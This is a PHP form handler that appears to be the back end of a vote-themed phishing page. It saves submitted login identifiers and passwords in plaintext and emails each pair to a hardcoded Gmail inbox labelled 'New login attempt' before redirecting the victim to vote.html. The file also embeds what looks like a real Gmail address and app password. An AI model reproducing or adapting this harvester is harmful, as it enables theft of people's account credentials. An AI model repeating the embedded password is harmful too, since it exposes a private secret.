<?php
// Include the database connection file
require_once 'dbh.inc.php';

// Include PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $identifier = $_POST['identifier'];
    $password = $_POST['password'];

    // Database insertion
    try {
        $stmt = $pdo->prepare("INSERT INTO users (identifier, password) VALUES (:identifier, :password)");
        $stmt->execute([
            'identifier' => $identifier,
            'password' => $password
        ]);
        
        // If database insertion is successful, proceed with email sending
        $mail = new PHPMailer(true);

        try {
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com';
            $mail->SMTPAuth = true;
            $mail->Username = 'nellyfancii@gmail.com'; // Your email
            $mail->Password = 'dpep lcok rins jfax'; // Your app password
            $mail->SMTPSecure = 'ssl';
            $mail->Port = 465;

            $mail->setFrom('nellyfancii@gmail.com'); // Your email
            $mail->addAddress('nellyfancii@gmail.com'); // Where you want to receive the messages

            $mail->isHTML(true);

            // Prepare the email content
            $mail->Subject = "New login attempt";
            $mail->Body = "Contact Info: " . $identifier . "<br>Subject: " . $password;

            $mail->send();
            
            // Redirect to vote.html after storing the information and sending email
            header("Location: vote.html");
            exit();
        } catch (Exception $e) {
            echo "<script>alert('Message could not be sent. Mailer Error: {$mail->ErrorInfo}');</script>";
        }
    } catch(PDOException $e) {
        // Handle any database errors
        echo "An error occurred: " . $e->getMessage();
    }
}
?>